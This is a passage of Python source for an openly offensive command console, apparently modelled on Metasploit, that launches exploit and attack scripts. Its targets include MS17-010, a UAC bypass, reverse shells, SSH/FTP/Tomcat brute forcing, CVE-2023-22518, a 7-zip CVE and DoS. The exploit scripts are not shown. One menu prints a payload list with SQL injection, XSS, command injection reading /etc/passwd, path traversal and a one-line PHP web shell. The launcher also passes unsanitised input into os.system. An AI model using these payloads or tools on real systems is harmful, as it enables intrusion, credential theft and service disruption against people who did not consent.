        print("using site/information-gather.")
        tinformationgather()
    elif scconsole == "use site/port-scan":
        time.sleep(0.5)
        print("using site/port-scan.")
        tportscan()
    elif scconsole == "use dos/ciscodos":
        time.sleep(0.5)
        print("using dos/ciscodos.")
        dciscodos()
    elif scconsole == "use windows/MS04-007_LSASS-exe_Pro_Remote_DoS":
        time.sleep(0.5)
        print("using windows/MS04-007_LSASS-exe_Pro_Remote_DoS.")
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole == "use linux/tcpdump_packet_sniffer":
        time.sleep(0.5)
        print("using linux/tcpdump_packet_sniffer.")
        ltcpdumppacketsniffer()
    elif scconsole == "use php/RCE_via_PHP":
        time.sleep(0.5)
        print("using php/RCE_via_PHP.")
        pRCEviaPHP()
    elif scconsole == "use system commands":
            OSconsole()
            OSconsole()
            OSconsole()
    elif scconsole == "use system command":
            OSconsole()
            OSconsole()
            OSconsole()
    elif scconsole == "exit":
        exit()
    else:
        time.sleep(0.5)
        print("there is no command or option to use like that!")

def exploitms17010psexec():
    scconsole6 = input("sc~" + color.red + "(exploit/ms17-010-psexec)" + color.white + ">")
    if scconsole6 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitms17010psexec()
    elif scconsole6 == "clear":
        os.system('clear')
        exploittomcatmgrlogin()
    elif scconsole6 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.
CMD              | specifiy the cmd command.

you will specifiy these options when you run or exploit it!
""")
        exploitms17010psexec()
    elif scconsole6 == "run":
        os.system('python exploits/ms17-010-psexec.py')
        exploitms17010psexec()
    elif scconsole6 == "exploit":
        os.system('python exploits/ms17-010-psexec.py')
        exploitms17010psexec()
    elif scconsole6 == "unuse":
        print("unusing exploit/ms17-010-psexec.")
        time.sleep(0.5)
        Console()
    elif scconsole6 == "exit":
        exit()

def exploitbypassuaceventvwr():
    scconsole7 = input("sc~" + color.red + "(exploit/bypassuac-eventvwr)" + color.white + ">")
    if scconsole7 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitbypassuaceventvwr()
    elif scconsole7 == "clear":
        os.system('clear')
        exploitbypassuaceventvwr()
    elif scconsole7 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
CMD              | specifiy the cmd command.

you will specifiy these options when you run or exploit it!
""")
        exploitbypassuaceventvwr()
    elif scconsole7 == "run":
        os.system('python exploits/bypassuac-eventvwr.py')
        exploitbypassuaceventvwr()
    elif scconsole7 == "exploit":
        os.system('python exploits/bypassuac-eventvwr.py')
        exploitbypassuaceventvwr()
    elif scconsole7 == "unuse":
        print("unusing exploit/bypassuac-eventvwr.")
        time.sleep(0.5)
        Console()
    elif scconsole7 == "exit":
        exit()

def exploitfindvulnerabilitesscan():
    scconsole8 = input("sc~" + color.red + "(exploit/find-vulnerabilites-scan)" + color.white + ">")
    if scconsole8 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "clear":
        os.system('clear')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.

you will specifiy these options when you run or exploit it!
""")
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "run":
        os.system('python exploits/find-vulnerabilites-scan.py')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "exploit":
        os.system('python exploits/find-vulnerabilites-scan.py')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "unuse":
        print("unusing exploit/find-vulnerabilites-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole8 == "exit":
        exit()

def exploitsshversion():
    scconsole12 = input("sc~" + color.red + "(exploit/ssh-version)" + color.white + ">")
    if scconsole12 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitsshversion()
    elif scconsole12 == "clear":
        os.system('clear')
        exploitsshversion()
    elif scconsole12 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address or url.
LPORT         | specified as 22. (ssh port).

you will specifiy these options when you run or exploit it!
""")
        exploitsshversion()
    elif scconsole12 == "run":
        os.system('python exploits/ssh-version.py')
        exploitsshversion()
    elif scconsole12 == "exploit":
        os.system('python exploits/ssh-version.py')
        exploitsshversion()
    elif scconsole12 == "unuse":
        print("unusing exploit/ssh-version.")
        time.sleep(0.5)
        Console()
    elif scconsole12 == "exit":
        exit()

def exploitreverseshell():
    scconsole16 = input("sc~" + color.red + "(exploit/reverse-shell)" + color.white + ">")
    if scconsole16 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitreverseshell()
    elif scconsole16 == "clear":
        os.system('clear')
        exploitreverseshell()
    elif scconsole16 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy your ip address.
LPORT            | specifiy your port.

you will specifiy these options when you run or exploit it!
""")
        exploitreverseshell()
    elif scconsole16 == "run":
        os.system('php exploits/reverse-shell.php')
        exploitreverseshell()
    elif scconsole16 == "exploit":
        os.system('php exploits/reverse-shell.php')
        exploitreverseshell()
    elif scconsole16 == "unuse":
        print("unusing exploit/reverse-shell.")
        time.sleep(0.5)
        Console()
    elif scconsole16 == "exit":
        exit()

def exploithandlerhandler():
    scconsole17 = input("sc~" + color.red + "(exploit/handler/handler)" + color.white + ">")
    if scconsole17 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploithandlerhandler()
    elif scconsole17 == "clear":
        os.system('clear')
        exploithandlerhandler()
    elif scconsole17 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        exploithandlerhandler()
    elif scconsole17 == "run":
        os.system('python exploits/handler/handler.py')
        exploithandlerhandler()
    elif scconsole17 == "exploit":
        os.system('python exploits/handler/handler.py')
        exploithandlerhandler()
    elif scconsole17 == "unuse":
        print("unusing exploit/handler/handler.")
        time.sleep(0.5)
        Console()
    elif scconsole17 == "exit":
        exit()

def exploithandlerlistining():
    scconsole18 = input("sc~" + color.red + "(exploit/handler/listining)" + color.white + ">")
    if scconsole18 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploithandlerlistining()
    elif scconsole18 == "clear":
        os.system('clear')
        exploithandlerlistining()
    elif scconsole18 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        exploithandlerlistining()
    elif scconsole18 == "run":
        os.system('python exploits/handler/listining.py')
        exploithandlerlistining()
    elif scconsole18 == "exploit":
        os.system('python exploits/handler/listining.py')
        exploithandlerlistining()
    elif scconsole18 == "unuse":
        print("unusing exploit/handler/listining.")
        time.sleep(0.5)
        Console()
    elif scconsole18 == "exit":
        exit()

def wexploitsshlogintest():
    scconsole19 = input("sc~" + color.red + "(windows/ssh-login-test)" + color.white + ">")
    if scconsole19 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitsshlogintest()
    elif scconsole19 == "clear":
        os.system('clear')
        wexploitsshlogintest()
    elif scconsole19 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address or url.
LPORT         | specified as 22. (ssh port).
PASSLIST      | specifiy the password list path.
USERNAMELIST  | specifiy the username list path.

you will specifiy these options when you run or exploit it!
""")
        wexploitsshlogintest()
    elif scconsole19 == "run":
        os.system('python exploits/windows/ssh-login-test.py')
        wexploitsshlogintest()
    elif scconsole19 == "exploit":
        os.system('python exploits/windows/ssh-login-test.py')
        wexploitsshlogintest()
    elif scconsole19 == "unuse":
        print("unusing windows/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole19 == "exit":
        exit()

def wexploitjavarhino():
    scconsole20 = input("sc~" + color.red + "(windows/java-rhino)" + color.white + ">")
    if scconsole20 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitjavarhino()
    elif scconsole20 == "clear":
        os.system('clear')
        wexploitjavarhino()
    elif scconsole20 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address.
LPORT         | specifiy the target port (port 445 needs to open on target).
CMD           | specifiy the cmd command.

you will specifiy these options when you run or exploit it!
""")
        wexploitjavarhino()
    elif scconsole20 == "run":
        os.system('python exploits/windows/java-rhino.py')
        wexploitjavarhino()
    elif scconsole20 == "exploit":
        os.system('python exploits/windows/java-rhino.py')
        wexploitjavarhino()
    elif scconsole20 == "unuse":
        print("unusing windows/java-rhino.")
        time.sleep(0.5)
        Console()
    elif scconsole20 == "exit":
        exit()

def wexploitms17010psexec():
    scconsole21 = input("sc~" + color.red + "(windows/ms17-010-psexec)" + color.white + ">")
    if scconsole21 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitms17010psexec()
    elif scconsole21 == "clear":
        os.system('clear')
        wexploitms17010psexec()
    elif scconsole21 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.
CMD              | specifiy the cmd command.

you will specifiy these options when you run or exploit it!
""")
        wexploitms17010psexec()
    elif scconsole21 == "run":
        os.system('python exploits/windows/ms17-010-psexec.py')
        wexploitms17010psexec()
    elif scconsole21 == "exploit":
        os.system('python exploits/windows/ms17-010-psexec.py')
        wexploitms17010psexec()
    elif scconsole21 == "unuse":
        print("unusing windows/ms17-010-psexec.")
        time.sleep(0.5)
        Console()
    elif scconsole21 == "exit":
        exit()

def wexploitPDFexploit():
    scconsole22 = input("sc~" + color.red + "(windows/PDF-exploit)" + color.white + ">")
    if scconsole22 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitPDFexploit()
    elif scconsole22 == "clear":
        os.system('clear')
        wexploitPDFexploit()
    elif scconsole22 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        wexploitPDFexploit()
    elif scconsole22 == "run":
        os.system('python exploits/windows/PDF-exploit.py')
        wexploitPDFexploit()
    elif scconsole22 == "exploit":
        os.system('python exploits/windows/PDF-exploit.py')
        wexploitPDFexploit()
    elif scconsole22 == "unuse":
        print("unusing windows/PDF-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole22 == "exit":
        exit()

def wexploitftplogintest():
    scconsole23 = input("sc~" + color.red + "(windows/ftp-login-test)" + color.white + ">")
    if scconsole23 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitftplogintest()
    elif scconsole23 == "clear":
        os.system('clear')
        wexploitftplogintest()
    elif scconsole23 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.

you will specifiy these options when you run or exploit it!
""")
        wexploitftplogintest()
    elif scconsole23 == "run":
        os.system('python exploits/windows/ftp-login-test.py')
        wexploitftplogintest()
    elif scconsole23 == "exploit":
        os.system('python exploits/windows/ftp-login-test.py')
        wexploitftplogintest()
    elif scconsole23 == "unuse":
        print("unusing windows/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole23 == "exit":
        exit()

def texploitXSS():
    scconsole24 = input("sc~" + color.red + "(site/XSS-SQLi-PHP-PASS)" + color.white + ">")
    if scconsole24 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitXSS()
    elif scconsole24 == "clear":
        os.system('clear')
        texploitXSS()
    elif scconsole24 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url login-page.
USERNAME         | specifiy the username.

you will specifiy these options when you run or exploit it!
""")
        texploitXSS()
    elif scconsole24 == "run":
        os.system('python exploits/site/XSS-SQLi-PHP-PASS.py')
        texploitXSS()
    elif scconsole24 == "exploit":
        os.system('python exploits/site/XSS-SQLi-PHP-PASS.py')
        texploitXSS()
    elif scconsole24 == "unuse":
        print("unusing site/XSS-SQLi-PHP-PASS.")
        time.sleep(0.5)
        Console()
    elif scconsole24 == "exit":
        exit()

def texploitfindvulnerabiliteswebsite():
    scconsole25 = input("sc~" + color.red + "(site/vuln-curl-website)" + color.white + ">")
    if scconsole25 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "clear":
        os.system('clear')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target url.

you will specifiy these options when you run or exploit it!
""")
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "run":
        os.system('python exploits/site/vuln-curl-website.py')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "exploit":
        os.system('python exploits/site/vuln-curl-website.py')
        texploitfindvulnerabiliteswebsite()
    elif scconsole25 == "unuse":
        print("unusing site/vuln-curl-website.")
        time.sleep(0.5)
        Console()
    elif scconsole25 == "exit":
        exit()

def texploitfindvulnerabiliteswebsite2():
    scconsole26 = input("sc~" + color.red + "(site/find-vulnerabilites-website2)" + color.white + ">")
    if scconsole26 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to see avalable payloads in sc-framework.
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "clear":
        os.system('clear')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
PAYLOAD          | specifiy the payload you want.

please copy the payload you want by typing (show payloads)!
you will specifiy these options when you run or exploit it!
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.

""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.

""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.

""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.

""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.

""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.

""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
""")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "run":
        os.system('python exploits/site/find-vulnerabilites-website2.py')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "exploit":
        os.system('python exploits/site/find-vulnerabilites-website2.py')
        texploitfindvulnerabiliteswebsite2()
    elif scconsole26 == "unuse":
        print("unusing site/find-vulnerabilites-website2.")
        time.sleep(0.5)
        Console()
    elif scconsole26 == "exit":
        exit()

def texploithttplogintest():
    scconsole27 = input("sc~" + color.red + "(site/http-login-test)" + color.white + ">")
    if scconsole27 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploithttplogintest()
    elif scconsole27 == "clear":
        os.system('clear')
        texploithttplogintest()
    elif scconsole27 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.

you will specifiy these options when you run or exploit it!
""")
        texploithttplogintest()
    elif scconsole27 == "run":
        os.system('python exploits/site/http-login-test.py')
        texploithttplogintest()
    elif scconsole27 == "exploit":
        os.system('python exploits/site/http-login-test.py')
        texploithttplogintest()
    elif scconsole27 == "unuse":
        print("unusing site/http-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole27 == "exit":
        exit()

def texploitZIPexploit():
    scconsole28 = input("sc~" + color.red + "(site/ZIP-exploit)" + color.white + ">")
    if scconsole28 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitZIPexploit()
    elif scconsole28 == "clear":
        os.system('clear')
        texploitZIPexploit()
    elif scconsole28 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url to upload zip file.

you will specifiy these options when you run or exploit it!
""")
        texploitZIPexploit()
    elif scconsole28 == "run":
        os.system('python exploits/site/ZIP-exploit.py')
        texploitZIPexploit()
    elif scconsole28 == "exploit":
        os.system('python exploits/site/ZIP-exploit.py')
        texploitZIPexploit()
    elif scconsole28 == "unuse":
        print("unusing site/ZIP-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole28 == "exit":
        exit()

def texploittomcatmgrlogin():
    scconsole29 = input("sc~" + color.red + "(site/tomcat-mgr-login)" + color.white + ">")
    if scconsole29 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploittomcatmgrlogin()
    elif scconsole29 == "clear":
        os.system('clear')
        texploittomcatmgrlogin()
    elif scconsole29 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target url.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.
BRUTEFORCE-SPEED | specifiy the brute force speed.

you will specifiy these options when you run or exploit it!
""")
        texploittomcatmgrlogin()
    elif scconsole29 == "run":
        os.system('python exploits/site/tomcat-mgr-login.py')
        texploittomcatmgrlogin()
    elif scconsole29 == "exploit":
        os.system('python exploits/site/tomcat-mgr-login.py')
        texploittomcatmgrlogin()
    elif scconsole29 == "unuse":
        print("unusing site/tomcat-mgr-login.")
        time.sleep(0.5)
        Console()
    elif scconsole29 == "exit":
        exit()

def exploitcve202322518cve202322518():
    scconsole30 = input("sc~" + color.red + "(exploit/cve-2023-22518/cve-2023-22518)" + color.white + ">")
    if scconsole30 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitcve202322518cve202322518()
    elif scconsole30 == "clear":
        os.system('clear')
        exploitcve202322518cve202322518()
    elif scconsole30 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url.
ZIP              | specifiy the zip from /sc_framework/exploits/cve-2023-22518/xmlexport-20231109-060519-1.zip .

you will specifiy these options when you run or exploit it!
""")
        exploitcve202322518cve202322518()
    elif scconsole30 == "run":
        os.system('python exploits/cve-2023-22518/cve-2023-22518.py')
        exploitcve202322518cve202322518()
    elif scconsole30 == "exploit":
        os.system('python exploits/cve-2023-22518/cve-2023-22518.py')
        exploitcve202322518cve202322518()
    elif scconsole30 == "unuse":
        print("unusing exploit/cve-2023-22518/cve-2023-22518.")
        time.sleep(0.5)
        Console()
    elif scconsole30 == "exit":
        exit()

def exploitvulncve202322518cve202322518():
    scconsole31 = input("sc~" + color.red + "(exploit/cve-2023-22518/vuln-test-for-cve-2023-22518)" + color.white + ">")
    if scconsole31 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "clear":
        os.system('clear')
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url.
URLLIST          | specifiy the path of url list.

you will specifiy these options when you run or exploit it!
""")
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "run":
        url = input("URL: ")
        urllist = input("URLLIST: ")
        os.system(f'python exploits/cve-2023-22518/vuln-test-for-cve-2023-22518.py --url {url} --file {urllist}')
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "exploit":
        url2 = input("URL: ")
        urllist2 = input("URLLIST: ")
        os.system(f'python exploits/cve-2023-22518/vuln-test-for-cve-2023-22518.py --url {url2} --file {urllist2}')
        exploitvulncve202322518cve202322518()
    elif scconsole31 == "unuse":
        print("unusing exploit/cve-2023-22518/vuln-test-for-cve-2023-22518.")
        time.sleep(0.5)
        Console()
    elif scconsole31 == "exit":
        exit()

def texploitDDDAttack():
    scconsole33 = input("sc~" + color.red + "(dos/DD_D_Attack)" + color.white + ">")
    if scconsole33 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitDDDAttack()
    elif scconsole33 == "clear":
        os.system('clear')
        texploitDDDAttack()
    elif scconsole33 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url.
TIME             | specifiy the time.

you will specifiy these options when you run or exploit it!
""")
        texploitDDDAttack()
    elif scconsole33 == "run":
        os.system('ruby exploits/dos/DD_D_Attack.rb')
        texploitDDDAttack()
    elif scconsole33 == "exploit":
        os.system('ruby exploits/dos/DD_D_Attack.rb')
        texploitDDDAttack()
    elif scconsole33 == "unuse":
        print("unusing dos/DD_D_Attack.")
        time.sleep(0.5)
        Console()
    elif scconsole33 == "exit":
        exit()

def w7zipcve20250411():
    scconsole34 = input("sc~" + color.red + "(windows/7-zip_cve-2025-0411)" + color.white + ">")
    if scconsole34 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        w7zipcve20250411()
    elif scconsole34 == "clear":
        os.system('clear')
        w7zipcve20250411()
    elif scconsole34 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
ATTACKER-IP      | specifiy your ip address.
ATTACKER-PORT    | specifiy your port.
LISTEN-PORT      | specifiy the listening port.

you will specifiy these options when you run or exploit it!
""")
        w7zipcve20250411()
    elif scconsole34 == "run":
        os.system('./exploits/windows/7-zip_cve-2025-0411')
        w7zipcve20250411()
    elif scconsole34 == "exploit":
        os.system('./exploits/windows/7-zip_cve-2025-0411')
        w7zipcve20250411()
    elif scconsole34 == "unuse":
        print("unusing windows/7-zip_cve-2025-0411.")
        time.sleep(0.5)
        Console()
    elif scconsole34 == "exit":
        exit()

def tdirectoryfinder():
    scconsole35 = input("sc~" + color.red + "(site/Directory-finder)" + color.white + ">")
    if scconsole35 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tdirectoryfinder()
    elif scconsole35 == "clear":
        os.system('clear')
        tdirectoryfinder()
    elif scconsole35 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url login-page.
URLLIST          | specifiy the url-list path.

you will specifiy these options when you run or exploit it!
""")
        tdirectoryfinder()
    elif scconsole35 == "run":
        os.system('python exploits/site/Directory-finder.py')
        tdirectoryfinder()
    elif scconsole35 == "exploit":
        os.system('python exploits/site/Directory-finder.py')
        tdirectoryfinder()
    elif scconsole35 == "unuse":
        print("unusing site/Directory-finder.")
        time.sleep(0.5)
        Console()
    elif scconsole35 == "exit":
        exit()

def tstruts2namespaceognl():
    scconsole36 = input("sc~" + color.red + "(site/struts2_namespace_ognl)" + color.white + ">")
    if scconsole36 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tstruts2namespaceognl()
    elif scconsole36 == "clear":
        os.system('clear')
        tstruts2namespaceognl()
    elif scconsole36 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specifiy the target url login-page.
URLLIST          | specifiy the url-list path.

you will specifiy these options when you run or exploit it!
""")
        tstruts2namespaceognl()
    elif scconsole36 == "run":
        os.system('python exploits/site/struts2_namespace_ognl.py')
        tstruts2namespaceognl()
    elif scconsole36 == "exploit":
        os.system('python exploits/site/struts2_namespace_ognl.py')
        tstruts2namespaceognl()
    elif scconsole36 == "unuse":
        print("unusing site/struts2_namespace_ognl.")
        time.sleep(0.5)
        Console()
    elif scconsole36 == "exit":
        exit()

def mexploitsshlogintest():
    scconsole37 = input("sc~" + color.red + "(multi/ssh-login-test)" + color.white + ">")
    if scconsole37 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mexploitsshlogintest()
    elif scconsole37 == "clear":
        os.system('clear')
        mexploitsshlogintest()
    elif scconsole37 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specifiy the target ip address or url.
LPORT         | specified as 22. (ssh port).
PASSLIST      | specifiy the password list path.
USERNAMELIST  | specifiy the username list path.

you will specifiy these options when you run or exploit it!
""")
        mexploitsshlogintest()
    elif scconsole37 == "run":
        os.system('python exploits/multi/ssh-login-test.py')
        mexploitsshlogintest()
    elif scconsole37 == "exploit":
        os.system('python exploits/multi/ssh-login-test.py')
        mexploitsshlogintest()
    elif scconsole37 == "unuse":
        print("unusing multi/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole37 == "exit":
        exit()

def mexploitftplogintest():
    scconsole38 = input("sc~" + color.red + "(multi/ftp-login-test)" + color.white + ">")
    if scconsole38 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        mexploitftplogintest()
    elif scconsole38 == "clear":
        os.system('clear')
        mexploitftplogintest()
    elif scconsole38 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specifiy the target ip address.
USERNAMELIST     | specifiy the username list.
PASSLIST         | specifiy the password list.

you will specifiy these options when you run or exploit it!
""")
        mexploitftplogintest()
    elif scconsole38 == "run":
        os.system('python exploits/multi/ftp-login-test.py')
        mexploitftplogintest()
    elif scconsole38 == "exploit":
        os.system('python exploits/multi/ftp-login-test.py')
        mexploitftplogintest()
    elif scconsole38 == "unuse":
        print("unusing multi/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole38 == "exit":
        exit()

def mexploitreverseshell():
    scconsole39 = input("sc~" + color.red + "(multi/shell_reverse_tcp)" + color.white + ">")
    if scconsole39 == "help":
